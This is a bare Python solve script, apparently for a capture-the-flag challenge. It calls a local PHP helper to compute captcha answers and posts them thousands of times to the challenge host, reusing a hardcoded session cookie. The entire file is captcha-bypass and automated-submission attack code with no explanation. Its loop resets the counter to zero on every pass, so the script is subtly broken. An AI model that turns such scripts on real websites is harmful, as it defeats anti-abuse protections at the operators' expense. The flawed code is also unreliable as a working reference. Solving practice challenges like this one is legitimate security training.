import subprocess
import requests

URL = "http://igot992problems.ctf/"
PHPSESSID = "7ucdlggso1rsqr7u2l16719hst"

def gen_captcha(index: int) -> str:
    res = subprocess.run(["/opt/homebrew/bin/php", "solve.php"], env={
        "VAL": str(index)
    }, stdout=subprocess.PIPE)

    return res.stdout.decode().strip()

requests.post(URL,
    cookies={
        "PHPSESSID": PHPSESSID
    },
    data={
        "value": 0
    }
)

for counter in range(0, 99 ** 2):
    counter = 0
    captcha = gen_captcha(counter) 

    res = requests.post(URL,
        cookies={
            "PHPSESSID": PHPSESSID
        },
        data={
            "value": captcha
        }
    )

print(res.text)